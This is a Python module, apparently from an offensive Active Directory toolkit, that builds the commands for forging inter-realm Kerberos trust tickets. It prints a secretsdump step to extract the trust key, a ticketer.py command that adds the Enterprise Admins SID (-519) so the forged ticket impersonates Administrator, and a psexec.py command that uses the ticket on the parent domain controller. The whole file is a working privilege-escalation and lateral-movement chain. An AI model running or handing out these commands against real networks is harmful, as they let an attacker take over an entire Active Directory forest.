"""Inter-realm trust ticket — forge referral tickets for cross-domain access."""
from __future__ import annotations
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.trust.trust_ticket.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_ticket_forge"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.001", "T1134.005"],
}


def run(args: Any) -> int:
    child_domain = args.domain
    parent_domain = getattr(args, "parent_domain", None)
    trust_key = getattr(args, "trust_key", None)
    child_sid = getattr(args, "child_sid", None)
    parent_sid = getattr(args, "parent_sid", None)
    impersonate = getattr(args, "impersonate", "Administrator")

    if not parent_domain or not trust_key:
        print("[!] --parent-domain and --trust-key required", file=sys.stderr)
        print("[*] Get trust key: secretsdump.py -just-dc-user '<child>$'")
        return 1

    if not child_sid:
        print("[!] --child-sid required (child domain SID)", file=sys.stderr)
        return 1

    extra_sid = "{}-519".format(parent_sid or "<parent-SID>")

    print("[*] Inter-realm trust ticket:")
    print("  Child domain:  {} ({})".format(child_domain, child_sid))
    print("  Parent domain: {} ({})".format(parent_domain, parent_sid or "?"))
    print("  Trust key:     {}...".format(trust_key[:16]))
    print("  Extra SID:     {} (Enterprise Admins)".format(extra_sid))
    print("  Impersonate:   {}".format(impersonate))

    print("\n[*] Forge command:")
    print("  ticketer.py -nthash {} -domain-sid {} "
          "-domain {} -extra-sid {} -spn krbtgt/{} {}".format(
              trust_key, child_sid, child_domain,
              extra_sid, parent_domain, impersonate))

    print("\n[*] Then use the ticket:")
    print("  export KRB5CCNAME={}.ccache".format(impersonate))
    print("  psexec.py -k -no-pass {}@dc.{}".format(impersonate, parent_domain))
    return 0
